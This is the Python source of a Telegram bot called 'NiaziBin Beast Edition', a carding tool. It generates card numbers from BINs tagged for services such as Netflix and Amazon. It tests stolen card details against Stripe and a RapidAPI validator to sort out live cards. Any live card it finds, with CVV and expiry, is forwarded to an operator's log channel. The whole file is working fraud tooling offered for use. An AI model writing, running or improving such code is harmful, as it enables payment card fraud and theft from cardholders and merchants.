import os, telebot, requests, time, stripe, random
from telebot import types 
from flask import Flask
from threading import Thread

# --- Railway/Uptime Setup ---
app = Flask('')
@app.route('/')
def home(): return "NiaziBin Beast Edition is Online"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    Thread(target=run).start()

# --- Configuration ---
TOKEN = os.getenv("TOKEN")
RAPID_KEY = os.getenv("RAPIDAPI_KEY")
STRIPE_SK = os.getenv("STRIPE_SK")
ADMIN_ID = 123456789  # <--- Apni ID dalo
LOG_CHANNEL = -100123456789 # <--- Live hits yahan milenge

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# --- Database: Site-Specific Hot BINs ---
HOT_BINS = {
    "411111": "Netflix/Spotify ✅",
    "489504": "Amazon/Cloudflare ✅",
    "549184": "Google Play/YouTube ✅",
    "450644": "Apple/iCloud ✅"
}

# --- Helper: Advanced BIN Lookup ---
def get_bin_info(cc):
    bin_num = cc[:6]
    site_tag = HOT_BINS.get(bin_num, "General / Unknown")
    try:
        r = requests.get(f"https://data.handyapi.com/bin/{bin_num}").json()
        bank = r.get('Bank', 'Unknown Bank')
        country = r.get('Country', {}).get('Name', 'N/A')
        return f"{bank} | {country} | {site_tag}"
    except: return f"N/A | {site_tag}"

# --- Commands ---

@bot.message_handler(commands=['start'])
def start(message):
    welcome = (
        f"<b>⚜️ NIAZIBIN BEAST V8.0 ⚜️</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <b>Check:</b> <code>/chk cc|mm|yy|cvv</code>\n"
        f"🎲 <b>Gen:</b> <code>/gen 411111</code>\n"
        f"🏦 <b>Bin:</b> <code>/bin 411111</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛰️ <b>Status:</b> <code>Elite V8.0 Active</code>"
    )
    bot.reply_to(message, welcome)

# --- FEATURE 1: Mass Gen + DB Lookup ---
@bot.message_handler(commands=['gen'])
def gen_handler(message):
    bin_num = message.text.replace('/gen', '').strip()[:6]
    if len(bin_num) < 6: return bot.reply_to(message, "❌ Use: <code>/gen 411111</code>")
    
    db_info = HOT_BINS.get(bin_num, "Standard BIN")
    cards = []
    for _ in range(10): # 10 cards generate karega
        extra = "".join([str(random.randint(0,9)) for _ in range(10)])
        mm = str(random.randint(1,12)).zfill(2)
        yy = random.randint(25,30)
        cvv = random.randint(100,999)
        cards.append(f"<code>{bin_num}{extra}|{mm}|20{yy}|{cvv}</code>")
    
    res = (
        f"<b>🎲 Generated for:</b> {bin_num}\n"
        f"<b>🔥 Target:</b> <code>{db_info}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(cards)
    )
    bot.reply_to(message, res)

# --- FEATURE 2: Site-Specific Checker ---
@bot.message_handler(commands=['chk'])
def chk_handler(message):
    start_time = time.time()
    input_data = message.text.replace('/chk', '').strip()
    if "|" not in input_data: return bot.reply_to(message, "❌ Format: <code>cc|mm|yy|cvv</code>")
    
    msg = bot.reply_to(message, "<b>⚡ Bypassing Gateways... ♻️</b>")
    cc = input_data.split('|')[0]
    bin_info = get_bin_info(cc)
    
    status, gateway, icon = "DEAD", "RapidAPI-V2", "❌"
    
    # Stripe Multi-Auth
    if STRIPE_SK:
        try:
            stripe.api_key = STRIPE_SK
            p = input_data.split('|')
            stripe.PaymentMethod.create(type="card", card={"number":p[0],"exp_month":int(p[1]),"exp_year":int(p[2]),"cvc":p[3]})
            status, gateway, icon = "LIVE / HIT", "Stripe-Elite 🔥", "✅"
        except Exception as e:
            err = str(e)
            if "declined" in err or "incorrect_cvc" in err: status, gateway = "DEAD", "Stripe-Elite 🔥"
            else:
                try:
                    headers = {"X-RapidAPI-Key": RAPID_KEY, "X-RapidAPI-Host": "credit-card-validator2.p.rapidapi.com"}
                    r = requests.post("https://credit-card-validator2.p.rapidapi.com/validate-credit-card", json={"cardNumber":cc}, headers=headers).json()
                    status, icon = ("LIVE", "✅") if r.get('isValid') else ("DEAD", "❌")
                except: status = "GATEWAY ERROR"

    time_taken = round(time.time() - start_time, 2)
    res = (
        f"{icon} <b>STATUS: {status}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <b>Card:</b> <code>{input_data}</code>\n"
        f"🏦 <b>Bin:</b> <code>{bin_info}</code>\n"
        f"⚡ <b>Gateway:</b> <code>{gateway}</code>\n"
        f"⏱️ <b>Time:</b> <code>{time_taken}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.edit_message_text(res, message.chat.id, msg.message_id)

    # --- FEATURE 3: Auto-Forward (The Scraper) ---
    if "LIVE" in status:
        bot.send_message(LOG_CHANNEL, f"🔥 <b>LIVE HIT FOUND!</b>\n\nCC: <code>{input_data}</code>\nBIN: {bin_info}\nBy: {message.from_user.first_name}")

if __name__ == "__main__":
    keep_alive()
    bot.delete_webhook()
    bot.infinity_polling()
